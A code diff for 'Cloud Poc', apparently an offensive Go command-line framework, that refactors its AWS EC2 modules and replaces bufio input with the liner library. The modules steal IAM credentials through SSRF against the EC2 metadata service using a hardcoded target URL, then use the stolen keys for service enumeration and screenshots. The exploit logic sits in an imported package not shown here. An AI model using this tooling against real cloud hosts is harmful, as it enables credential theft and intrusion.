@@ -1,13 +1,13 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"os"
 	"reflect"
 	"strings"
 
 	"github.com/gookit/color"
+	"github.com/peterh/liner"
 
 	ec2 "github.com/windasunny/cloud-poc/module/aws/ec2"
 )
@@ -18,22 +18,14 @@ type CloudPoc struct {
 	exploit   string
 }
 
-type ec2Token struct {
-	IamRole         string
-	AccessKeyId     string
-	SecretAccessKey string
-	Token           string
-	SsrfUrl         string
-}
-
 type awsCreds struct {
 	Region          string
 	AccessKeyId     string
 	SecretAccessKey string
 }
 
-var ec2GetToken ec2Token
 var awsCredsInfo awsCreds
+var ec2Exploit *ec2.Ec2
 
 func NewCloudPoc() *CloudPoc {
 	return &CloudPoc{
@@ -108,6 +100,7 @@ func (cloud *CloudPoc) Help(args []string) {
 	color.White.Println("  help - Show this help message")
 	color.White.Println("  use - Use aws module")
 	color.White.Println("    aws/ec2/credential - use ec2 imds exploit module")
+	color.White.Println("    aws/ec2/searchservice - use ec2 imds exploit module")
 	color.White.Println("    aws/ec2/screenshot - use ec2 screenshot exploit module")
 	color.White.Println("  quit - Exit the program")
 }
@@ -143,32 +136,31 @@ func (cloud *CloudPoc) Use(exploit string) {
 	case "aws/ec2/credential":
 		printPrompt(cloud, exploit)
 
-		ec2Exploit := ec2.NewEC2Module("http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=")
+		ec2Exploit = ec2.NewEC2Module("http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=")
 
-		ec2Credential := ec2Exploit.Exploit()
-		ec2GetToken = ec2Token{
-			IamRole:         ec2Credential.IamRole,
-			AccessKeyId:     ec2Credential.AccessKeyId,
-			SecretAccessKey: ec2Credential.SecretAccessKey,
-			Token:           ec2Credential.Token,
-			SsrfUrl:         ec2Credential.SsrfUrl,
+		ec2Exploit.Exploit()
+
+		break
+	case "aws/ec2/searchservice":
+		printPrompt(cloud, exploit)
+		if ec2Exploit.AccessKeyId == "" && ec2Exploit.SecretAccessKey == "" {
+			color.Red.Println("Please use the 'aws/ec2/credential' module first.")
+			return
 		}
 
-		fmt.Println(ec2GetToken.IamRole)
-		fmt.Println(ec2GetToken.AccessKeyId)
-		fmt.Println(ec2GetToken.SecretAccessKey)
-		fmt.Println(ec2GetToken.Token)
+		ec2Exploit.SearchService()
+
 		break
 	case "aws/ec2/screenshot":
 		printPrompt(cloud, exploit)
 
 		if awsCredsInfo.AccessKeyId == "" && awsCredsInfo.SecretAccessKey == "" {
-			color.Red.Println("Please use the 'aws/ec2/credential' module first.")
+			color.Red.Println("Please add aws credential first.")
 			return
 		}
 
 		ec2.Screenshot(awsCredsInfo.AccessKeyId, awsCredsInfo.SecretAccessKey)
-
+		break
 	default:
 		color.Red.Println("Unknown module. Type 'help' for available commands.")
 		return
@@ -179,11 +171,25 @@ func (cloud *CloudPoc) cmdLoop() {
 	cloud.asciiArt()
 	color.Cyan.Println("Welcome to Cloud Poc, which provides cloud POC. Type \"help\" to see the list of available commands.\n")
 
-	scanner := bufio.NewScanner(os.Stdin)
+	line := liner.NewLiner()
+	defer line.Close()
+
+	line.SetCtrlCAborts(true)
+
 	for {
 		color.Green.Print(cloud.prompt)
-		scanner.Scan()
-		input := scanner.Text()
+		input, err := line.Prompt("")
+
+		if err == liner.ErrPromptAborted {
+			color.Green.Println("Exiting...")
+			break
+		} else if err != nil {
+			color.Red.Println("Error reading line:", err)
+			continue
+		}
+
+		line.AppendHistory(input)
+
 		if strings.ToLower(input) == "quit" || strings.ToLower(input) == "exit" {
 			color.Green.Println("Exiting...")
 			break
